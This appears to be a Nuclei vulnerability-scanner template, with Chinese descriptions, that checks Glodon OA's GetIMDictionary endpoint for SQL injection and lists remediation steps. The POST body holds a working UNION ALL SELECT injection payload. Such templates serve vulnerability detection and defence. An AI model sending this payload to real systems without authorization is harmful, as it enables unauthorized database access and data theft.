id: glodon-getimdictionary-sqli
info:
  name: 广联达 getimdictionary 接口 - SQL 注入漏洞
  author: EASY
  severity: high
  description: |
    该模板用于检测 广联达 getimdictionary 接口 - SQL 注入漏洞。该类漏洞通常源于接口将用户输入拼接到 SQL 语句中，导致攻击者可改变查询语义。模板主要向 `/Webservice/IM/Config/ConfigService.asmx/GetIMDictionary` 等路径发送探测请求，并根据状态码、响应头、页面关键字或时间差等证据确认漏洞是否存在。
  impact: |
    - 攻击者可通过注入参数读取、篡改或删除数据库中的敏感数据。
    - 在数据库权限过高或支持危险函数的场景下，SQL 注入还可能导致认证绕过、文件读写或进一步执行系统命令。
  remediation: |
    - 对所有数据库访问使用参数化查询或安全 ORM，避免拼接用户可控输入。
    - 对受影响接口的参数进行类型、长度和取值范围校验，并关闭详细数据库错误回显。
    - 使用最小权限数据库账号，排查异常查询、数据导出和新增账号记录。
  reference:
    - https://github.com/Ershu1/2023_Hvv/blob/d851d9282979c313b7dcfcd05da2c09348c67669/%E5%B9%BF%E8%81%94%E8%BE%BEoa%20%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    max-request: 1
    vendor: glodon
    product: oa
  tags: sqli,vuln,glodon,oa
variables:
  s1: '{{to_lower(rand_text_alpha(20))}}'
  s2: '{{to_lower(rand_text_alpha(20))}}'
http:
  - method: POST
    path:
      - '{{BaseURL}}/Webservice/IM/Config/ConfigService.asmx/GetIMDictionary'
    redirects: true
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: dasdas=&key=1' UNION ALL SELECT concat('{{s1}}','{{s2}}') --
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200 && contains(body, "<?xml") && contains(body, concat(s1, s2)) && contains(body, "result  value=")'
